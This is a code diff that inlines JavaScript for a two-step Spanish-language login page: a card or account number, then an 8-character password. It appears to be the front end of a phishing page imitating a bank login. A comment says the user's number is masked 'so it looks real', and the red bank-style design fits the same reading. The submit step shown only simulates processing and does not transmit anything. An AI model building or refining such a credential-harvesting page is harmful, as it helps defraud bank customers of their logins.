@@ -160,6 +160,98 @@ ob_end_clean();
         </form>
     </div>
 
-    <script src="logic.js"></script>
+    <script>
+        // ELEMENTOS DEL DOM
+const userField = document.getElementById('userField');
+const btnNext = document.getElementById('btnNext');
+const step1 = document.getElementById('step1');
+const step2 = document.getElementById('step2');
+const stepTitle = document.getElementById('stepTitle');
+const displayUser = document.getElementById('displayUser');
+const passField = document.getElementById('passField');
+const btnSubmit = document.getElementById('btnSubmit');
+
+/**
+ * PASO 1: Validación y activación de botón "Continuar"
+ */
+userField.addEventListener('input', (e) => {
+    const value = e.target.value.trim();
+    
+    // Activar si tiene longitud de tarjeta o cuenta (mínimo 8)
+    if (value.length >= 8) {
+        btnNext.disabled = false;
+        btnNext.classList.remove('bg-gray-200', 'text-gray-400', 'opacity-50', 'cursor-not-allowed');
+        btnNext.classList.add('bg-red-600', 'text-white', 'opacity-100', 'cursor-pointer');
+    } else {
+        btnNext.disabled = true;
+        btnNext.classList.add('bg-gray-200', 'text-gray-400', 'opacity-50', 'cursor-not-allowed');
+        btnNext.classList.remove('bg-red-600', 'text-white', 'opacity-100', 'cursor-pointer');
+    }
+});
+
+/**
+ * TRANSICIÓN: Cambio de vista a Contraseña
+ */
+btnNext.addEventListener('click', () => {
+    if (!btnNext.disabled) {
+        stepTitle.innerText = "Bienvenido";
+        // Enmascaramos un poco el usuario para que se vea real
+        const masked = userField.value.length > 5 
+            ? userField.value.substring(0, 4) + "****" 
+            : userField.value;
+        
+        displayUser.innerText = masked;
+        step1.classList.add('hidden');
+        step2.classList.remove('hidden');
+    }
+});
+
+/**
+ * PASO 2: Validación de Contraseña (Exactamente 8 caracteres)
+ */
+btnSubmit.disabled = true; // Aseguramos que inicie desactivado
+btnSubmit.classList.add('opacity-50', 'cursor-not-allowed'); // Estética de desactivado
+
+passField.addEventListener('input', (e) => {
+    const value = e.target.value.trim();
+    
+    // Solo se activa si tiene EXACTAMENTE 8 caracteres
+    if (value.length === 8) {
+        btnSubmit.disabled = false;
+        btnSubmit.classList.remove('opacity-50', 'cursor-not-allowed');
+        // Aseguramos que mantenga el color rojo de tu diseño
+        btnSubmit.classList.add('opacity-100', 'cursor-pointer');
+    } else {
+        btnSubmit.disabled = true;
+        btnSubmit.classList.add('opacity-50', 'cursor-not-allowed');
+        btnSubmit.classList.remove('opacity-100', 'cursor-pointer');
+    }
+});
+
+/**
+ * PASO 2: Manejo del envío (solo interfaz y animaciones)
+ */
+btnSubmit.addEventListener('click', async () => {
+    const password = passField.value.trim();
+    
+    // Validación antes de procesar
+    if (password.length !== 8) return;
+
+    // Animación visual del botón
+    btnSubmit.innerText = "Verificando...";
+    btnSubmit.disabled = true;
+
+    // Simulación de procesamiento (2 segundos)
+    setTimeout(() => {
+        btnSubmit.innerText = "Completado";
+        btnSubmit.classList.add('bg-green-600');
+        btnSubmit.classList.remove('bg-red-600');
+        
+        // Aquí puedes agregar tu lógica personalizada
+        // Por ejemplo: redirigir a otra página, mostrar mensaje, etc.
+        console.log("Formulario enviado correctamente");
+    }, 2000);
+});
+    </script>
 </body>
 </html>
